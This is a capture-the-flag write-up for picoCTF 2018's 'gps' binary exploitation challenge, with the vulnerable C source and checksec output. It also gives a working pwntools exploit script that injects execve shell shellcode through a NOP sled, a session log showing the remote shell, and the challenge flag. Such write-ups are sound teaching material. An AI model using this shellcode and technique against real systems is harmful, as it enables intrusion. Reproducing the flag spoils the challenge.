# gps
Binary Exploitation, 550 points

## Description:
> You got really lost in the wilderness, with nothing but your trusty gps. Can you find your way back to a shell and get the flag?

```c
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

#define GPS_ACCURACY 1337

typedef void (fn_t)(void);

void initialize() {
    printf("GPS Initializing");
    for (int i = 0; i < 10; ++i) {
        usleep(300000);
        printf(".");
    }
    printf("Done\n");
}

void acquire_satellites() {
    printf("Acquiring satellites.");
    for (int i = 0; i < 3; ++i) {
        printf("Satellite %d", i);
        for (int j = 0; j < rand() % 10; ++j) {
            usleep(133700);
            printf(".");
        }
        if (i != 3) {
            printf("Done\n");
        } else {
            printf("Weak signal.\n");
        }
    }

    printf("\nGPS Initialized.\n");
    printf("Warning: Weak signal causing low measurement accuracy\n\n");
}

void *query_position() {
  char stk;
  int offset = rand() % GPS_ACCURACY - (GPS_ACCURACY / 2);
  void *ret = &stk + offset;
  return ret;
}


int main() {
    setbuf(stdout, NULL);

    char buffer[0x1000];
    srand((unsigned) (uintptr_t) buffer);

    initialize();
    acquire_satellites();

    printf("We need to access flag.txt.\nCurrent position: %p\n", query_position());

    printf("What's your plan?\n> ");
    fgets(buffer, sizeof(buffer), stdin);

    fn_t *location;

    printf("Where do we start?\n> ");
    scanf("%p", (void**) &location);

    location();
    return 0;
}
```

## Solution:

The program reads user input into a local buffer, then jumps to a location of our choice. We need to use this to get a shell.

Running the program through checksec, we get the following:
```console
root@kali:/media/sf_CTFs/pico/gps# checksec.sh -f gps
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   81 Symbols      Yes     0               4       gps
```

NX is disabled, so we can execute from the stack. It's easy to feed the program with shellcode, since it simply asks for input. Now we just need to find a way to jump to our shellcode.

We know the approximate location of the buffer on the stack, since we are given the location of a local variable in `query_position()`, give or take `(GPS_ACCURACY / 2)` bytes.

The local buffer is 0x1000 bytes long, while `(GPS_ACCURACY / 2)` is 668. So, if we put the shellcode at the end of the buffer, and we calculate the worst case (where we are off by 688 plus a bit more for the difference between `stk` and `buffer`), we still have more than enough room to create a "nop slide" that will execute our code.

The script:
```python
from pwn import *
import re

context(arch='amd64', os='linux', bits = '64')
#context.log_level="debug"

BUF_LEN = 0x1000 - 5
GPS_ACCURACY = 1337

nop = asm(shellcraft.nop())
shellcode = pwnlib.shellcraft.amd64.linux.sh()
sc_asm = asm(shellcode)
log.info("Shellcode: {}".format(shellcode))
log.info("Length of shellcode: {}".format(len(sc_asm)))

payload = nop * (BUF_LEN - len(sc_asm)) + sc_asm

p = remote("2018shell3.picoctf.com", 58896)
out = p.recvuntil("> ")
address = re.search("Current position: (0x[a-fA-F0-9]+)", out).group(1)
log.info("Current position: {}".format(address))

guess = int(address, 16) + GPS_ACCURACY

log.info("Destination: 0x{:02x}".format(guess))

p.sendline(payload)
p.recvuntil("> ")
p.sendline(format(guess, 'x'))

p.interactive()
```

The output:
```console
root@kali:/media/sf_CTFs/pico/gps# python exploit.py
[*] Shellcode:     /* execve(path='/bin///sh', argv=['sh'], envp=0) */
        /* push '/bin///sh\x00' */
        push 0x68
        mov rax, 0x732f2f2f6e69622f
        push rax
        mov rdi, rsp
        /* push argument array ['sh\x00'] */
        /* push 'sh\x00' */
        push 0x1010101 ^ 0x6873
        xor dword ptr [rsp], 0x1010101
        xor esi, esi /* 0 */
        push rsi /* null terminate */
        push 8
        pop rsi
        add rsi, rsp
        push rsi /* 'sh\x00' */
        mov rsi, rsp
        xor edx, edx /* 0 */
        /* call execve() */
        push SYS_execve /* 0x3b */
        pop rax
        syscall
[*] Length of shellcode: 48
[+] Opening connection to 2018shell3.picoctf.com on port 58896: Done
[*] Current position: 0x7ffd0d92363b
[*] Destination: 0x7ffd0d923b74
[*] Switching to interactive mode
$ ls
flag.txt
gps
gps.c
xinet_startup.sh
$ cat flag.txt
picoCTF{s4v3_y0urs3lf_w1th_a_sl3d_0f_n0ps_alhujefk}
$ exit
[*] Got EOF while reading in interactive
$
$
[*] Closed connection to 2018shell3.picoctf.com port 58896
[*] Got EOF while sending in interactive
```

The flag: picoCTF{s4v3_y0urs3lf_w1th_a_sl3d_0f_n0ps_alhujefk}